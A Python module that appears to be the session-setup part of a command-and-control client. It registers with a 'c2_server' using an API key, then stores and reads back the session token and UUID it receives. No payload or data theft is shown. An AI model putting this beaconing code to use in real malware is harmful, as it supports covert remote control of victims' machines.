import requests
import json
import time
from Variables import c2_server, rsa_key, api_key, wrong_api_key

####################################################################################################################

def get_session_token():
    headers = {
        'API-KEY': api_key
    }
    
    try:
        response = requests.post(c2_server + "/create_session", headers=headers)
        time.sleep(2)
        
        if response.status_code == 200:
            response_data = response.json()
            session_token = response_data.get("session_token")
            unique_uuid = response_data.get("uuid")

            if session_token and unique_uuid:
                with open("session_token.json", "w") as f:
                    json.dump({"session_token": session_token, "uuid": unique_uuid}, f, indent=4)
                print(f"Session token and uuid saved: {session_token} {unique_uuid}") # Debug Message
                return session_token, unique_uuid
            else:
                print("Session token not found") # Debug Message
        else:
            print(f"Failed session token: {response.status_code}") # Debug Message
            print(f"Error: {response.text}") # Debug Message
            
    except Exception as e:
        print(f"Error request: {e}") # Debug Message
    
    return None

####################################################################################################################

def read_session_token():
    try:
        with open("session_token.json", "r") as f:
            data = json.load(f)
            return data.get("session_token")
    except FileNotFoundError:
        print("Session token not found") # Debug Message
    except json.JSONDecodeError:
        print("Error reading session token") # Debug Message
    return None

####################################################################################################################

def read_unique_uuid():
    try:
        with open("session_token.json", "r") as f:
            data = json.load(f)
            return data.get("uuid")
    except FileNotFoundError:
        print("uuid not found") # Debug Message
    except json.JSONDecodeError:
        print("Error reading uuid") # Debug Message
    return None

####################################################################################################################